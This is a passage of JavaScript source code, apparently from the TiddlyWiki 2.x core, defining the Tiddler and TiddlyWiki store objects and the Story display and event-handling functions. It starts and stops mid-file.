Tiddler.prototype.clearChangeCount = function()
{
	if(this.fields['changecount']) {
		delete this.fields['changecount'];
	}
};

// Returns true if the tiddler has been updated since the tiddler was created or downloaded
Tiddler.prototype.isTouched = function()
{
	var changeCount = this.fields['changecount'];
	if(changeCount === undefined)
		changeCount = 0;
	return changeCount > 0;
};

// Format the text for storage in an RSS item
Tiddler.prototype.saveToRss = function(url)
{
	var s = [];
	s.push("<item>");
	s.push("<title" + ">" + this.title.htmlEncode() + "</title" + ">");
	s.push("<description>" + wikifyStatic(this.text,null,this).htmlEncode() + "</description>");
	for(var t=0; t<this.tags.length; t++)
		s.push("<category>" + this.tags[t] + "</category>");
	s.push("<link>" + url + "#" + encodeURIComponent(String.encodeTiddlyLink(this.title)) + "</link>");
	s.push("<pubDate>" + this.modified.toGMTString() + "</pubDate>");
	s.push("</item>");
	return s.join("\n");
};

// Change the text and other attributes of a tiddler
Tiddler.prototype.set = function(title,text,modifier,modified,tags,created,fields)
{
	this.assign(title,text,modifier,modified,tags,created,fields);
	this.changed();
	return this;
};

// Change the text and other attributes of a tiddler without triggered a tiddler.changed() call
Tiddler.prototype.assign = function(title,text,modifier,modified,tags,created,fields)
{
	if(title != undefined)
		this.title = title;
	if(text != undefined)
		this.text = text;
	if(modifier != undefined)
		this.modifier = modifier;
	if(modified != undefined)
		this.modified = modified;
	if(created != undefined)
		this.created = created;
	if(fields != undefined)
		this.fields = fields;
	if(tags != undefined)
		this.tags = (typeof tags == "string") ? tags.readBracketedList() : tags;
	else if(this.tags == undefined)
		this.tags = [];
	return this;
};

// Get the tags for a tiddler as a string (space delimited, using [[brackets]] for tags containing spaces)
Tiddler.prototype.getTags = function()
{
	return String.encodeTiddlyLinkList(this.tags);
};

// Test if a tiddler carries a tag
Tiddler.prototype.isTagged = function(tag)
{
	return this.tags.indexOf(tag) != -1;
};

// Static method to convert "\n" to newlines, "\s" to "\"
Tiddler.unescapeLineBreaks = function(text)
{
	return text ? text.unescapeLineBreaks() : "";
};

// Convert newlines to "\n", "\" to "\s"
Tiddler.prototype.escapeLineBreaks = function()
{
	return this.text.escapeLineBreaks();
};

// Updates the secondary information (like links[] array) after a change to a tiddler
Tiddler.prototype.changed = function()
{
	this.links = [];
	var t = this.autoLinkWikiWords() ? 0 : 1;
	var tiddlerLinkRegExp = t==0 ? config.textPrimitives.tiddlerAnyLinkRegExp : config.textPrimitives.tiddlerForcedLinkRegExp;
	tiddlerLinkRegExp.lastIndex = 0;
	var formatMatch = tiddlerLinkRegExp.exec(this.text);
	while(formatMatch) {
		var lastIndex = tiddlerLinkRegExp.lastIndex;
		if(t==0 && formatMatch[1] && formatMatch[1] != this.title) {
			// wikiWordLink
			if(formatMatch.index > 0) {
				var preRegExp = new RegExp(config.textPrimitives.unWikiLink+"|"+config.textPrimitives.anyLetter,"mg");
				preRegExp.lastIndex = formatMatch.index-1;
				var preMatch = preRegExp.exec(this.text);
				if(preMatch.index != formatMatch.index-1)
					this.links.pushUnique(formatMatch[1]);
			} else {
				this.links.pushUnique(formatMatch[1]);
			}
		}
		else if(formatMatch[2-t] && !config.formatterHelpers.isExternalLink(formatMatch[3-t])) // titledBrackettedLink
			this.links.pushUnique(formatMatch[3-t]);
		else if(formatMatch[4-t] && formatMatch[4-t] != this.title) // brackettedLink
			this.links.pushUnique(formatMatch[4-t]);
		tiddlerLinkRegExp.lastIndex = lastIndex;
		formatMatch = tiddlerLinkRegExp.exec(this.text);
	}
	this.linksUpdated = true;
};

Tiddler.prototype.getSubtitle = function()
{
	var theModifier = this.modifier;
	if(!theModifier)
		theModifier = config.messages.subtitleUnknown;
	var theModified = this.modified;
	if(theModified)
		theModified = theModified.toLocaleString();
	else
		theModified = config.messages.subtitleUnknown;
	return config.messages.tiddlerLinkTooltip.format([this.title,theModifier,theModified]);
};

Tiddler.prototype.isReadOnly = function()
{
	return readOnly;
};

Tiddler.prototype.autoLinkWikiWords = function()
{
	return !(this.isTagged("systemConfig") || this.isTagged("excludeMissing"));
};

Tiddler.prototype.generateFingerprint = function()
{
	return "0x" + Crypto.hexSha1Str(this.text);
};

Tiddler.prototype.getServerType = function()
{
	var serverType = null;
	if(this.fields && this.fields['server.type'])
		serverType = this.fields['server.type'];
	if(!serverType)
		serverType = this.fields['wikiformat'];
	if(serverType && !config.adaptors[serverType])
		serverType = null;
	return serverType;
};

Tiddler.prototype.getAdaptor = function()
{
	var serverType = this.getServerType();
	if(serverType)
		return new config.adaptors[serverType];
	else
		return null;
};

//--
//-- TiddlyWiki() object contains Tiddler()s
//--

function TiddlyWiki()
{
	var tiddlers = {}; // Hashmap by name of tiddlers
	this.tiddlersUpdated = false;
	this.namedNotifications = []; // Array of {name:,notify:} of notification functions
	this.notificationLevel = 0;
	this.slices = {}; // map tiddlerName->(map sliceName->sliceValue). Lazy.
	this.clear = function() {
		tiddlers = {};
		this.setDirty(false);
	};
	this.fetchTiddler = function(title) {
		return tiddlers[title];
	};
	this.deleteTiddler = function(title) {
		delete this.slices[title];
		delete tiddlers[title];
	};
	this.addTiddler = function(tiddler) {
		delete this.slices[tiddler.title];
		tiddlers[tiddler.title] = tiddler;
	};
	this.forEachTiddler = function(callback) {
		for(var t in tiddlers) {
			var tiddler = tiddlers[t];
			if(tiddler instanceof Tiddler)
				callback.call(this,t,tiddler);
		}
	};
}

TiddlyWiki.prototype.setDirty = function(dirty)
{
	this.dirty = dirty;
};

TiddlyWiki.prototype.isDirty = function()
{
	return this.dirty;
};

TiddlyWiki.prototype.suspendNotifications = function()
{
	this.notificationLevel--;
};

TiddlyWiki.prototype.resumeNotifications = function()
{
	this.notificationLevel++;
};

// Invoke the notification handlers for a particular tiddler
TiddlyWiki.prototype.notify = function(title,doBlanket)
{
	if(!this.notificationLevel) {
		for(var t=0; t<this.namedNotifications.length; t++) {
			var n = this.namedNotifications[t];
			if((n.name == null && doBlanket) || (n.name == title))
				n.notify(title);
		}
	}
};

// Invoke the notification handlers for all tiddlers
TiddlyWiki.prototype.notifyAll = function()
{
	if(!this.notificationLevel) {
		for(var t=0; t<this.namedNotifications.length; t++) {
			var n = this.namedNotifications[t];
			if(n.name)
				n.notify(n.name);
		}
	}
};

// Add a notification handler to a tiddler
TiddlyWiki.prototype.addNotification = function(title,fn)
{
	for(var i=0; i<this.namedNotifications.length; i++) {
		if((this.namedNotifications[i].name == title) && (this.namedNotifications[i].notify == fn))
			return this;
	}
	this.namedNotifications.push({name: title, notify: fn});
	return this;
};

TiddlyWiki.prototype.removeTiddler = function(title)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler) {
		this.deleteTiddler(title);
		this.notify(title,true);
		this.setDirty(true);
	}
};

TiddlyWiki.prototype.tiddlerExists = function(title)
{
	var t = this.fetchTiddler(title);
	return t != undefined;
};

TiddlyWiki.prototype.isShadowTiddler = function(title)
{
	return typeof config.shadowTiddlers[title] == "string";
};

TiddlyWiki.prototype.getTiddler = function(title)
{
	var t = this.fetchTiddler(title);
	if(t != undefined)
		return t;
	else
		return null;
};

TiddlyWiki.prototype.getTiddlerText = function(title,defaultText)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler)
		return tiddler.text;
	if(!title)
		return defaultText;
	var pos = title.indexOf(config.textPrimitives.sliceSeparator);
	if(pos != -1) {
		var slice = this.getTiddlerSlice(title.substr(0,pos),title.substr(pos + config.textPrimitives.sliceSeparator.length));
		if(slice)
			return slice;
	}
	if(this.isShadowTiddler(title))
		return config.shadowTiddlers[title];
	if(defaultText != undefined)
		return defaultText;
	return null;
};

TiddlyWiki.prototype.slicesRE = /(?:[\'\/]*~?([\.\w]+)[\'\/]*\:[\'\/]*\s*(.*?)\s*$)|(?:\|[\'\/]*~?([\.\w]+)\:?[\'\/]*\|\s*(.*?)\s*\|)/gm;

// @internal
TiddlyWiki.prototype.calcAllSlices = function(title)
{
	var slices = {};
	var text = this.getTiddlerText(title,"");
	this.slicesRE.lastIndex = 0;
	do {
		var m = this.slicesRE.exec(text);
		if(m) {
			if(m[1])
				slices[m[1]] = m[2];
			else
				slices[m[3]] = m[4];
		}
	} while(m);
	return slices;
};

// Returns the slice of text of the given name
TiddlyWiki.prototype.getTiddlerSlice = function(title,sliceName)
{
	var slices = this.slices[title];
	if(!slices) {
		slices = this.calcAllSlices(title);
		this.slices[title] = slices;
	}
	return slices[sliceName];
};

// Build an hashmap of the specified named slices of a tiddler
TiddlyWiki.prototype.getTiddlerSlices = function(title,sliceNames)
{
	var r = {};
	for(var t=0; t<sliceNames.length; t++) {
		var slice = this.getTiddlerSlice(title,sliceNames[t]);
		if(slice)
			r[sliceNames[t]] = slice;
	}
	return r;
};

TiddlyWiki.prototype.getRecursiveTiddlerText = function(title,defaultText,depth)
{
	var bracketRegExp = new RegExp("(?:\\[\\[([^\\]]+)\\]\\])","mg");
	var text = this.getTiddlerText(title,null);
	if(text == null)
		return defaultText;
	var textOut = [];
	var lastPos = 0;
	do {
		var match = bracketRegExp.exec(text);
		if(match) {
			textOut.push(text.substr(lastPos,match.index-lastPos));
			if(match[1]) {
				if(depth <= 0)
					textOut.push(match[1]);
				else
					textOut.push(this.getRecursiveTiddlerText(match[1],"[[" + match[1] + "]]",depth-1));
			}
			lastPos = match.index + match[0].length;
		} else {
			textOut.push(text.substr(lastPos));
		}
	} while(match);
	return textOut.join("");
};

TiddlyWiki.prototype.setTiddlerTag = function(title,status,tag)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler) {
		var t = tiddler.tags.indexOf(tag);
		if(t != -1)
			tiddler.tags.splice(t,1);
		if(status)
			tiddler.tags.push(tag);
		tiddler.changed();
		this.incChangeCount(title);
		this.notify(title,true);
		this.setDirty(true);
	}
};

TiddlyWiki.prototype.addTiddlerFields = function(title,fields)
{
	var tiddler = this.fetchTiddler(title);
	if(!tiddler)
		return;
	merge(tiddler.fields,fields);
	tiddler.changed();
	this.incChangeCount(title);
	this.notify(title,true);
	this.setDirty(true);
};

TiddlyWiki.prototype.saveTiddler = function(title,newTitle,newBody,modifier,modified,tags,fields,clearChangeCount,created)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler) {
		created = created ? created : tiddler.created; // Preserve created date
		this.deleteTiddler(title);
	} else {
		created = created ? created : modified;
		tiddler = new Tiddler();
	}
	tiddler.set(newTitle,newBody,modifier,modified,tags,created,fields);
	this.addTiddler(tiddler);
	if(clearChangeCount)
		tiddler.clearChangeCount();
	else
		tiddler.incChangeCount();
	if(title != newTitle)
		this.notify(title,true);
	this.notify(newTitle,true);
	this.setDirty(true);
	return tiddler;
};

// Reset the sync status of a freshly synced tiddler
TiddlyWiki.prototype.resetTiddler = function(title)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler) {
		tiddler.clearChangeCount();
		this.notify(title,true);
		this.setDirty(true);
	}
};

TiddlyWiki.prototype.incChangeCount = function(title)
{
	var tiddler = this.fetchTiddler(title);
	if(tiddler)
		tiddler.incChangeCount();
};

TiddlyWiki.prototype.createTiddler = function(title)
{
	var tiddler = this.fetchTiddler(title);
	if(!tiddler) {
		tiddler = new Tiddler();
		tiddler.title = title;
		this.addTiddler(tiddler);
		this.setDirty(true);
	}
	return tiddler;
};

// Load contents of a TiddlyWiki from an HTML DIV
TiddlyWiki.prototype.loadFromDiv = function(src,idPrefix,noUpdate)
{
	this.idPrefix = idPrefix;
	var storeElem = (typeof src == "string") ? document.getElementById(src) : src;
	if(!storeElem)
		return;
	var tiddlers = this.getLoader().loadTiddlers(this,storeElem.childNodes);
	this.setDirty(false);
	if(!noUpdate) {
		for(var i = 0;i<tiddlers.length; i++)
			tiddlers[i].changed();
	}
};

// Load contents of a TiddlyWiki from a string
// Returns null if there's an error
TiddlyWiki.prototype.importTiddlyWiki = function(text)
{
	var posDiv = locateStoreArea(text);
	if(!posDiv)
		return null;
	var content = "<" + "html><" + "body>" + text.substring(posDiv[0],posDiv[1] + endSaveArea.length) + "<" + "/body><" + "/html>";
	// Create the iframe
	var iframe = document.createElement("iframe");
	iframe.style.display = "none";
	document.body.appendChild(iframe);
	var doc = iframe.document;
	if(iframe.contentDocument)
		doc = iframe.contentDocument; // For NS6
	else if(iframe.contentWindow)
		doc = iframe.contentWindow.document; // For IE5.5 and IE6
	// Put the content in the iframe
	doc.open();
	doc.writeln(content);
	doc.close();
	// Load the content into a TiddlyWiki() object
	var storeArea = doc.getElementById("storeArea");
	this.loadFromDiv(storeArea,"store");
	// Get rid of the iframe
	iframe.parentNode.removeChild(iframe);
	return this;
};

TiddlyWiki.prototype.updateTiddlers = function()
{
	this.tiddlersUpdated = true;
	this.forEachTiddler(function(title,tiddler) {
		tiddler.changed();
	});
};

// Return all tiddlers formatted as an HTML string
TiddlyWiki.prototype.allTiddlersAsHtml = function()
{
	return store.getSaver().externalize(store);
};

// Return an array of tiddlers matching a search regular expression
TiddlyWiki.prototype.search = function(searchRegExp,sortField,excludeTag)
{
	var candidates = this.reverseLookup("tags",excludeTag,false);
	var results = [];
	for(var t=0; t<candidates.length; t++) {
		if((candidates[t].title.search(searchRegExp) != -1) || (candidates[t].text.search(searchRegExp) != -1))
			results.push(candidates[t]);
	}
	if(!sortField)
		sortField = "title";
	results.sort(function(a,b) {return a[sortField] < b[sortField] ? -1 : (a[sortField] == b[sortField] ? 0 : +1);});
	return results;
};

// Return an array of all the tags in use. Each member of the array is another array where [0] is the name of the tag and [1] is the number of occurances
TiddlyWiki.prototype.getTags = function(excludeTag)
{
	var results = [];
	this.forEachTiddler(function(title,tiddler) {
		for(var g=0; g<tiddler.tags.length; g++) {
			var tag = tiddler.tags[g];
			if(excludeTag) {
				var t = store.fetchTiddler(tag);
				if(t && t.isTagged(excludeTag))
					return false;
			}
			var f = false;
			for(var c=0; c<results.length; c++) {
				if(results[c][0] == tag) {
					f = true;
					results[c][1]++;
				}
			}
			if(!f)
				results.push([tag,1]);
		}
	});
	results.sort(function(a,b) {return a[0].toLowerCase() < b[0].toLowerCase() ? -1 : (a[0].toLowerCase() == b[0].toLowerCase() ? 0 : +1);});
	return results;
};

// Return an array of the tiddlers that are tagged with a given tag
TiddlyWiki.prototype.getTaggedTiddlers = function(tag,sortField)
{
	return this.reverseLookup("tags",tag,true,sortField);
};

// Return an array of the tiddlers that link to a given tiddler
TiddlyWiki.prototype.getReferringTiddlers = function(title,unusedParameter,sortField)
{
	if(!this.tiddlersUpdated)
		this.updateTiddlers();
	return this.reverseLookup("links",title,true,sortField);
};

// Return an array of the tiddlers that do or do not have a specified entry in the specified storage array (ie, "links" or "tags")
// lookupMatch == true to match tiddlers, false to exclude tiddlers
TiddlyWiki.prototype.reverseLookup = function(lookupField,lookupValue,lookupMatch,sortField)
{
	var results = [];
	this.forEachTiddler(function(title,tiddler) {
		var f = !lookupMatch;
		for(var lookup=0; lookup<tiddler[lookupField].length; lookup++) {
			if(tiddler[lookupField][lookup] == lookupValue)
				f = lookupMatch;
		}
		if(f)
			results.push(tiddler);
	});
	if(!sortField)
		sortField = "title";
	results.sort(function(a,b) {return a[sortField] < b[sortField] ? -1 : (a[sortField] == b[sortField] ? 0 : +1);});
	return results;
};

// Return the tiddlers as a sorted array
TiddlyWiki.prototype.getTiddlers = function(field,excludeTag)
{
	var results = [];
	this.forEachTiddler(function(title,tiddler) {
		if(excludeTag == undefined || !tiddler.isTagged(excludeTag))
			results.push(tiddler);
	});
	if(field)
		results.sort(function(a,b) {return a[field] < b[field] ? -1 : (a[field] == b[field] ? 0 : +1);});
	return results;
};

// Return array of names of tiddlers that are referred to but not defined
TiddlyWiki.prototype.getMissingLinks = function(sortField)
{
	if(!this.tiddlersUpdated)
		this.updateTiddlers();
	var results = [];
	this.forEachTiddler(function (title,tiddler) {
		if(tiddler.isTagged("excludeMissing") || tiddler.isTagged("systemConfig"))
			return;
		for(var n=0; n<tiddler.links.length;n++) {
			var link = tiddler.links[n];
			if(this.fetchTiddler(link) == null && !this.isShadowTiddler(link))
				results.pushUnique(link);
		}
	});
	results.sort();
	return results;
};

// Return an array of names of tiddlers that are defined but not referred to
TiddlyWiki.prototype.getOrphans = function()
{
	var results = [];
	this.forEachTiddler(function (title,tiddler) {
		if(this.getReferringTiddlers(title).length == 0 && !tiddler.isTagged("excludeLists"))
			results.push(title);
	});
	results.sort();
	return results;
};

// Return an array of names of all the shadow tiddlers
TiddlyWiki.prototype.getShadowed = function()
{
	var results = [];
	for(var t in config.shadowTiddlers) {
		if(typeof config.shadowTiddlers[t] == "string")
			results.push(t);
	}
	results.sort();
	return results;
};

// Return an array of tiddlers that have been touched since they were downloaded or created
TiddlyWiki.prototype.getTouched = function()
{
	var results = [];
	this.forEachTiddler(function(title,tiddler) {
		if(tiddler.isTouched())
			results.push(tiddler);
		});
	results.sort();
	return results;
};

// Resolves a Tiddler reference or tiddler title into a Tiddler object, or null if it doesn't exist
TiddlyWiki.prototype.resolveTiddler = function(tiddler)
{
	var t = (typeof tiddler == 'string') ? this.getTiddler(tiddler) : tiddler;
	return t instanceof Tiddler ? t : null;
};

TiddlyWiki.prototype.getLoader = function()
{
	if(!this.loader)
		this.loader = new TW21Loader();
	return this.loader;
};

TiddlyWiki.prototype.getSaver = function()
{
	if(!this.saver)
		this.saver = new TW21Saver();
	return this.saver;
};

// Returns true if path is a valid field name (path),
// i.e. a sequence of identifiers, separated by '.'
TiddlyWiki.isValidFieldName = function(name)
{
	var match = /[a-zA-Z_]\w*(\.[a-zA-Z_]\w*)*/.exec(name);
	return match && (match[0] == name);
};

// Throws an exception when name is not a valid field name.
TiddlyWiki.checkFieldName = function(name)
{
	if(!TiddlyWiki.isValidFieldName(name))
		throw config.messages.invalidFieldName.format([name]);
};

function StringFieldAccess(n,readOnly)
{
	this.set = readOnly ?
			function(t,v) {if(v != t[n]) throw config.messages.fieldCannotBeChanged.format([n]);} :
			function(t,v) {if(v != t[n]) {t[n] = v; return true;}};
	this.get = function(t) {return t[n];};
}

function DateFieldAccess(n)
{
	this.set = function(t,v) {
		var d = v instanceof Date ? v : Date.convertFromYYYYMMDDHHMM(v);
		if(d != t[n]) {
			t[n] = d; return true;
		}
	};
	this.get = function(t) {return t[n].convertToYYYYMMDDHHMM();};
}

function LinksFieldAccess(n)
{
	this.set = function(t,v) {
		var s = (typeof v == "string") ? v.readBracketedList() : v;
		if(s.toString() != t[n].toString()) {
			t[n] = s; return true;
		}
	};
	this.get = function(t) {return String.encodeTiddlyLinkList(t[n]);};
}

TiddlyWiki.standardFieldAccess = {
	// The set functions return true when setting the data has changed the value.
	"title":    new StringFieldAccess("title",true),
	// Handle the "tiddler" field name as the title
	"tiddler":  new StringFieldAccess("title",true),
	"text":     new StringFieldAccess("text"),
	"modifier": new StringFieldAccess("modifier"),
	"modified": new DateFieldAccess("modified"),
	"created":  new DateFieldAccess("created"),
	"tags":     new LinksFieldAccess("tags")
};

TiddlyWiki.isStandardField = function(name)
{
	return TiddlyWiki.standardFieldAccess[name] != undefined;
};

// Sets the value of the given field of the tiddler to the value.
// Setting an ExtendedField's value to null or undefined removes the field.
// Setting a namespace to undefined removes all fields of that namespace.
// The fieldName is case-insensitive.
// All values will be converted to a string value.
TiddlyWiki.prototype.setValue = function(tiddler,fieldName,value)
{
	TiddlyWiki.checkFieldName(fieldName);
	var t = this.resolveTiddler(tiddler);
	if(!t)
		return;
	fieldName = fieldName.toLowerCase();
	var isRemove = (value === undefined) || (value === null);
	var accessor = TiddlyWiki.standardFieldAccess[fieldName];
	if(accessor) {
		if(isRemove)
			// don't remove StandardFields
			return;
		var h = TiddlyWiki.standardFieldAccess[fieldName];
		if(!h.set(t,value))
			return;
	} else {
		var oldValue = t.fields[fieldName];
		if(isRemove) {
			if(oldValue !== undefined) {
				// deletes a single field
				delete t.fields[fieldName];
			} else {
				// no concrete value is defined for the fieldName
				// so we guess this is a namespace path.
				// delete all fields in a namespace
				var re = new RegExp('^'+fieldName+'\\.');
				var dirty = false;
				for(var n in t.fields) {
					if(n.match(re)) {
						delete t.fields[n];
						dirty = true;
					}
				}
				if(!dirty)
					return;
			}
		} else {
			// the "normal" set case. value is defined (not null/undefined)
			// For convenience provide a nicer conversion Date->String
			value = value instanceof Date ? value.convertToYYYYMMDDHHMMSSMMM() : String(value);
			if(oldValue == value)
				return;
			t.fields[fieldName] = value;
		}
	}
	// When we are here the tiddler/store really was changed.
	this.notify(t.title,true);
	if(!fieldName.match(/^temp\./))
		this.setDirty(true);
};

// Returns the value of the given field of the tiddler.
// The fieldName is case-insensitive.
// Will only return String values (or undefined).
TiddlyWiki.prototype.getValue = function(tiddler,fieldName)
{
	var t = this.resolveTiddler(tiddler);
	if(!t)
		return undefined;
	fieldName = fieldName.toLowerCase();
	var accessor = TiddlyWiki.standardFieldAccess[fieldName];
	if(accessor) {
		return accessor.get(t);
	}
	return t.fields[fieldName];
};

// Calls the callback function for every field in the tiddler.
// When callback function returns a non-false value the iteration stops
// and that value is returned.
// The order of the fields is not defined.
// @param callback a function(tiddler,fieldName,value).
TiddlyWiki.prototype.forEachField = function(tiddler,callback,onlyExtendedFields)
{
	var t = this.resolveTiddler(tiddler);
	if(!t)
		return undefined;
	for(var n in t.fields) {
		var result = callback(t,n,t.fields[n]);
		if(result)
			return result;
		}
	if(onlyExtendedFields)
		return undefined;
	for(var n in TiddlyWiki.standardFieldAccess) {
		if(n == "tiddler")
			// even though the "title" field can also be referenced through the name "tiddler"
			// we only visit this field once.
			continue;
		var result = callback(t,n,TiddlyWiki.standardFieldAccess[n].get(t));
		if(result)
			return result;
	}
	return undefined;
};

//--
//-- Story functions
//--

function Story(container,idPrefix)
{
	this.container = container;
	this.idPrefix = idPrefix;
	this.highlightRegExp = null;
}

Story.prototype.forEachTiddler = function(fn)
{
	var place = document.getElementById(this.container);
	if(!place)
		return;
	var e = place.firstChild;
	while(e) {
		var n = e.nextSibling;
		var title = e.getAttribute("tiddler");
		fn.call(this,title,e);
		e = n;
	}
};

Story.prototype.displayTiddlers = function(srcElement,titles,template,animate,unused,customFields,toggle)
{
	for(var t = titles.length-1;t>=0;t--)
		this.displayTiddler(srcElement,titles[t],template,animate,unused,customFields);
};

Story.prototype.displayTiddler = function(srcElement,title,template,animate,unused,customFields,toggle)
{
	var place = document.getElementById(this.container);
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem) {
		if(toggle)
			this.closeTiddler(title,true);
		else
			this.refreshTiddler(title,template,false,customFields);
	} else {
		var before = this.positionTiddler(srcElement);
		tiddlerElem = this.createTiddler(place,before,title,template,customFields);
	}
	if(srcElement && typeof srcElement !== "string") {
		if(config.options.chkAnimate && (animate == undefined || animate == true) && anim && typeof Zoomer == "function" && typeof Scroller == "function")
			anim.startAnimating(new Zoomer(title,srcElement,tiddlerElem),new Scroller(tiddlerElem));
		else
			window.scrollTo(0,ensureVisible(tiddlerElem));
	}
};

Story.prototype.positionTiddler = function(srcElement)
{
	var place = document.getElementById(this.container);
	var before = null;
	if(typeof srcElement == "string") {
		switch(srcElement) {
			case "top":
				before = place.firstChild;
				break;
			case "bottom":
				before = null;
				break;
		}
	} else {
		var after = this.findContainingTiddler(srcElement);
		if(after == null) {
			before = place.firstChild;
		} else if(after.nextSibling) {
			before = after.nextSibling;
			if(before.nodeType != 1)
				before = null;
		}
	}
	return before;
};

Story.prototype.createTiddler = function(place,before,title,template,customFields)
{
	var tiddlerElem = createTiddlyElement(null,"div",this.idPrefix + title,"tiddler");
	tiddlerElem.setAttribute("refresh","tiddler");
	if(customFields)
		tiddlerElem.setAttribute("tiddlyFields",customFields);
	place.insertBefore(tiddlerElem,before);
	var defaultText = null;
	if(!store.tiddlerExists(title) && !store.isShadowTiddler(title))
		defaultText = this.loadMissingTiddler(title,customFields,tiddlerElem);
	this.refreshTiddler(title,template,false,customFields,defaultText);
	return tiddlerElem;
};

Story.prototype.loadMissingTiddler = function(title,fields,tiddlerElem)
{
	var tiddler = new Tiddler(title);
	tiddler.fields = typeof fields == "string" ?  fields.decodeHashMap() : (fields ? fields : {});
	var serverType = tiddler.getServerType();
	var host = tiddler.fields['server.host'];
	var workspace = tiddler.fields['server.workspace'];
	if(!serverType | !host)
		return null;
	var sm = new SyncMachine(serverType,{
			start: function() {
				return this.openHost(host,"openWorkspace");
			},
			openWorkspace: function() {
				return this.openWorkspace(workspace,"getTiddler");
			},
			getTiddler: function() {
				return this.getTiddler(title,"gotTiddler");
			},
			gotTiddler: function(tiddler) {
				if(tiddler && tiddler.text) {
					var downloaded = new Date();
					if(!tiddler.created)
						tiddler.created = downloaded;
					if(!tiddler.modified)
						tiddler.modified = tiddler.created;
					store.saveTiddler(tiddler.title,tiddler.title,tiddler.text,tiddler.modifier,tiddler.modified,tiddler.tags,tiddler.fields,true,tiddler.created);
					autoSaveChanges();
				}
				delete this;
				return true;
			},
			error: function(message) {
				displayMessage("Error loading missing tiddler from %0: %1".format([host,message]));
			}
		});
	sm.go();
	return config.messages.loadingMissingTiddler.format([title,serverType,host,workspace]);
};

Story.prototype.chooseTemplateForTiddler = function(title,template)
{
	if(!template)
		template = DEFAULT_VIEW_TEMPLATE;
	if(template == DEFAULT_VIEW_TEMPLATE || template == DEFAULT_EDIT_TEMPLATE)
		template = config.tiddlerTemplates[template];
	return template;
};

Story.prototype.getTemplateForTiddler = function(title,template,tiddler)
{
	return store.getRecursiveTiddlerText(template,null,10);
};

Story.prototype.refreshTiddler = function(title,template,force,customFields,defaultText)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
	if(tiddlerElem) {
		if(tiddlerElem.getAttribute("dirty") == "true" && !force)
			return tiddlerElem;
		template = this.chooseTemplateForTiddler(title,template);
		var currTemplate = tiddlerElem.getAttribute("template");
		if((template != currTemplate) || force) {
			var tiddler = store.getTiddler(title);
			if(!tiddler) {
				tiddler = new Tiddler();
				if(store.isShadowTiddler(title)) {
					tiddler.set(title,store.getTiddlerText(title),config.views.wikified.shadowModifier,version.date,[],version.date);
				} else {
					var text = template=="EditTemplate" ?
								config.views.editor.defaultText.format([title]) :
								config.views.wikified.defaultText.format([title]);
					text = defaultText ? defaultText : text;
					var fields = customFields ? customFields.decodeHashMap() : null;
					tiddler.set(title,text,config.views.wikified.defaultModifier,version.date,[],version.date,fields);
				}
			}
			tiddlerElem.setAttribute("tags",tiddler.tags.join(" "));
			tiddlerElem.setAttribute("tiddler",title);
			tiddlerElem.setAttribute("template",template);
			var me = this;
			tiddlerElem.onmouseover = this.onTiddlerMouseOver;
			tiddlerElem.onmouseout = this.onTiddlerMouseOut;
			tiddlerElem.ondblclick = this.onTiddlerDblClick;
			tiddlerElem[window.event?"onkeydown":"onkeypress"] = this.onTiddlerKeyPress;
			var html = this.getTemplateForTiddler(title,template,tiddler);
			tiddlerElem.innerHTML = html;
			applyHtmlMacros(tiddlerElem,tiddler);
			if(store.getTaggedTiddlers(title).length > 0)
				addClass(tiddlerElem,"isTag");
			else
				removeClass(tiddlerElem,"isTag");
			if(!store.tiddlerExists(title)) {
				if(store.isShadowTiddler(title))
					addClass(tiddlerElem,"shadow");
				else
					addClass(tiddlerElem,"missing");
			} else {
				removeClass(tiddlerElem,"shadow");
				removeClass(tiddlerElem,"missing");
			}
			if(customFields)
				this.addCustomFields(tiddlerElem,customFields);
			forceReflow();
		}
	}
	return tiddlerElem;
};

Story.prototype.addCustomFields = function(place,customFields)
{
	var fields = customFields.decodeHashMap();
	var w = document.createElement("div");
	w.style.display = "none";
	place.appendChild(w);
	for(var t in fields) {
		var e = document.createElement("input");
		e.setAttribute("type","text");
		e.setAttribute("value",fields[t]);
		w.appendChild(e);
		e.setAttribute("edit",t);
	}
};

Story.prototype.refreshAllTiddlers = function() 
{
	var place = document.getElementById(this.container);
	var e = place.firstChild;
	if(!e)
		return;
	this.refreshTiddler(e.getAttribute("tiddler"),e.getAttribute("template"),true);
	while((e = e.nextSibling) != null) 
		this.refreshTiddler(e.getAttribute("tiddler"),e.getAttribute("template"),true);
};

Story.prototype.onTiddlerMouseOver = function(e)
{
	if(window.addClass instanceof Function)
		addClass(this,"selected");
};

Story.prototype.onTiddlerMouseOut = function(e)
{
	if(window.removeClass instanceof Function)
		removeClass(this,"selected");
};

Story.prototype.onTiddlerDblClick = function(e)
{
	if(!e) var e = window.event;
	var theTarget = resolveTarget(e);
	if(theTarget && theTarget.nodeName.toLowerCase() != "input" && theTarget.nodeName.toLowerCase() != "textarea") {
		if(document.selection && document.selection.empty)
			document.selection.empty();
		config.macros.toolbar.invokeCommand(this,"defaultCommand",e);
		e.cancelBubble = true;
		if(e.stopPropagation) e.stopPropagation();
		return true;
	} else {
		return false;
	}
};

Story.prototype.onTiddlerKeyPress = function(e)
{
	if(!e) var e = window.event;
	clearMessage();
	var consume = false; 
	var title = this.getAttribute("tiddler");
	var target = resolveTarget(e);
	switch(e.keyCode) {
		case 9: // Tab
			if(config.options.chkInsertTabs && target.tagName.toLowerCase() == "textarea") {
				replaceSelection(target,String.fromCharCode(9));
				consume = true; 
			}
			if(config.isOpera) {
				target.onblur = function() {
					this.focus();
					this.onblur = null;
				};
			}
			break;
		case 13: // Ctrl-Enter
		case 10: // Ctrl-Enter on IE PC
		case 77: // Ctrl-Enter is "M" on some platforms
			if(e.ctrlKey) {
				blurElement(this);
				config.macros.toolbar.invokeCommand(this,"defaultCommand",e);
				consume = true;
			}
			break; 
		case 27: // Escape
			blurElement(this);
			config.macros.toolbar.invokeCommand(this,"cancelCommand",e);
			consume = true;
			break;
	}
	e.cancelBubble = consume;
	if(consume) {
		if(e.stopPropagation) e.stopPropagation(); // Stop Propagation
		e.returnValue = true; // Cancel The Event in IE
		if(e.preventDefault ) e.preventDefault(); // Cancel The Event in Moz
	}
	return !consume;
};

Story.prototype.getTiddlerField = function(title,field)
{
	var tiddlerElem = document.getElementById(this.idPrefix + title);
